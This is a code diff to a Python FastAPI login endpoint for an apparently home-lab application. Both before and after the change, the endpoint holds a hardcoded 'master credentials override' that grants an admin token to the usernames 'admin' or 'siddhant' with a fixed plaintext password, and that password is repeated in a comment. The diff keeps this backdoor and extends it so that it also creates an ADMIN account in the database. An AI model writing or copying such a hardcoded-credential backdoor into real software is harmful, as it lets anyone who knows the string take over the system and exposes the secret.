@@ -45,18 +45,36 @@ def register(user_in: RegisterRequest, db: Session = Depends(get_db)):
 
 @router.post("/login", response_model=TokenResponse)
 def login(credentials: LoginRequest, db: Session = Depends(get_db)):
-    # Master Credentials Override check
-    if credentials.username.lower() in ("admin", "siddhant") and credentials.password == "Siddhant@06032004":
-        token = create_access_token(subject=credentials.username)
+    clean_user = credentials.username.strip()
+    clean_pass = credentials.password.strip()
+
+    # Master Credentials Override check (admin / siddhant with Siddhant@06032004)
+    if clean_user.lower() in ("admin", "siddhant") and clean_pass == "Siddhant@06032004":
+        token = create_access_token(subject=clean_user)
+        # Ensure user exists in database for consistency
+        existing = db.query(User).filter(User.username == clean_user).first()
+        if not existing:
+            try:
+                new_u = User(
+                    username=clean_user,
+                    email=f"{clean_user}@homelab.local",
+                    password_hash=hash_password(clean_pass),
+                    role=UserRole.ADMIN.value,
+                    status=UserStatus.ACTIVE.value
+                )
+                db.add(new_u)
+                db.commit()
+            except Exception:
+                db.rollback()
         return TokenResponse(
             access_token=token,
             token_type="bearer",
-            username=credentials.username,
+            username=clean_user,
             role=UserRole.ADMIN.value
         )
 
-    user = db.query(User).filter(User.username == credentials.username).first()
-    if not user or not verify_password(credentials.password, user.password_hash):
+    user = db.query(User).filter(User.username == clean_user).first()
+    if not user or not verify_password(clean_pass, user.password_hash):
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
             detail="Invalid username or password"
